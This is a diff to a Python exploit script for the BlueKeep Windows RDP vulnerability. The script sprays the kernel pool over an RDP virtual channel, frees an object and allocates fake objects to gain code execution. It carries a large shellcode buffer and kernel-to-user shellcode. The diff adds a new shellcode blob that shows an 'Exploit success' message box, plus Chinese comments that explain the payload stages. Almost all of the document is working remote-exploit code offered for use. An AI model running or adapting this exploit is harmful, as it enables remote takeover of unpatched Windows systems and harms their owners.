@@ -3,17 +3,18 @@ import socket
 import binascii
 import time
 
+
 def pool_spray(s, crypter, payload):
 
     times = 10000
     count = 0
 
-    while count < times: 
+    while count < times:
 
-        count += 1 
+        count += 1
         #print('time through %d' % count)
 
-        try: 
+        try:
 
             s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, payload))
 
@@ -22,6 +23,7 @@ def pool_spray(s, crypter, payload):
             print('ConnectionResetError pool_spray Aborting')
 
             quit()
+
 
 def main():
 
@@ -34,6 +36,7 @@ def main():
 
     target = (host, port)
 
+    # 开启sokect，并连接
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(target)
 
@@ -46,7 +49,7 @@ def main():
     shellcode_address = b'\x28\xf0\x4f\x87'
 
     # replace buf with your shellcode
-    buf =  b""
+    buf = b""
     buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
     buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
     buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
@@ -72,7 +75,6 @@ def main():
     buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
     buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
     buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
-
 
     # bluekeep_kshellcode_x86.asm
     # ring 0 to ring 3 shellcode
@@ -140,14 +142,39 @@ def main():
     payload = b'\x2c\xf0\x4f\x87' + shellcode
     payload = payload + b'\x5a' * (payload_size - len(payload))
 
-
+    # payload 攻击汇编语句 用于建立连接
+    # crypter 建立连接后返回的结构体
+    # fake_obj 攻击汇编语句 用于蓝屏
     print('[+] spraying pool')
     pool_spray(s, crypter, payload)
+
+    ###################################################
 
     fake_obj_size = 168
     call_offset = 108
     fake_obj = b'\x00'*call_offset + shellcode_address
-    fake_obj =  fake_obj + b'\x00' * (fake_obj_size - len(fake_obj)) 
+    fake_obj = fake_obj + b'\x00' * (fake_obj_size - len(fake_obj))
+
+    #########################################
+
+    outCode = b"\xEB\x67\x55\x8B\xEC\x64\xA1\x30"
+    outCode += b"\x00\x00\x00\x8B\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x70\x28\x80\x7E"
+    outCode += b"\x0C\x33\x75\xF5\x8B\x40\x10\x8B\xF8\x03\x7F\x3C\x8B\x7F\x78\x03"
+    outCode += b"\xF8\x8B\xDF\x8B\x7B\x20\x03\xF8\x33\xC9\x8B\x34\x8F\x03\xF0\x41"
+
+    outCode += b"\x8B\x54\x24\x08\x39\x16\x75\xF2\x8B\x54\x24\x0C\x39\x56\x04\x75"
+    outCode += b"\xE8\x8B\x7B\x24\x03\xF8\x8B\x0C\x4F\x81\xE1\xFF\xFF\x00\x00\x8B"
+    outCode += b"\x7B\x1C\x03\xF8\x49\xC1\xE1\x02\x8B\x3C\x0F\x03\xC7\x5D\xC2\x08"
+    outCode += b"\x00\x68\x72\x6F\x63\x41\x68\x47\x65\x74\x50\xE8\x8A\xFF\xFF\xFF"
+    outCode += b"\x50\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\xE8\x7A\xFF\xFF\xFF"
+    outCode += b"\x50\x68\x33\x32\x00\x00\x68\x75\x73\x65\x72\x54\xFF\xD0\x83\xC4"
+    outCode += b"\x08\x68\x6F\x78\x41\x00\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73"
+    outCode += b"\x54\x50\xFF\x54\x24\x18\x83\xC4\x0C"
+    outCode += b"\x33\xD2\x52\x68\x66\x6C\x6F\x77\x68\x4F\x76\x65\x72\x68\x65\x73"
+    outCode += b"\x73\x00\x68\x73\x75\x63\x63\x68\x6F\x69\x74\x20\x68\x45\x78\x70"
+    outCode += b"\x6C\x52\x8D\x5C\x24\x14\x53\x8D\x5C\x24\x08\x53\x52\xFF\xD0\x83\xC4\x24"
+
+    #############################################
 
     time.sleep(.5)
     print('[+] sending free')
@@ -156,13 +183,14 @@ def main():
 
     print('[+] allocating fake objects')
     while count < times:
-        
-        count += 1 
+
+        count += 1
         #print('time through %d' % count)
 
-        try: 
+        try:
 
-            s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, fake_obj))
+            # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, fake_obj))
+            s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, outCode))
 
         except ConnectionResetError:
 
@@ -171,6 +199,5 @@ def main():
     s.close()
 
 
-if __name__== "__main__":
+if __name__ == "__main__":
     main()
-
